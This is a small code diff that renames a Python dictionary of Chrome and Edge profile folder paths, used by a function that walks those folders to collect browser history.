@@ -18,7 +18,7 @@ from datetime import datetime, timedelta
 LOCAL = os.getenv("LOCALAPPDATA")
 TEMP = os.getenv("TEMP")
 
-BROWSERS = {
+PATHS = {
     'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
     'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
 }
@@ -26,7 +26,7 @@ BROWSERS = {
 def history():
     res = []
 
-    for browser, base in BROWSERS.items():
+    for browser, base in PATHS.items():
         if not os.path.exists(base):
             continue
         for entry in os.listdir(base):
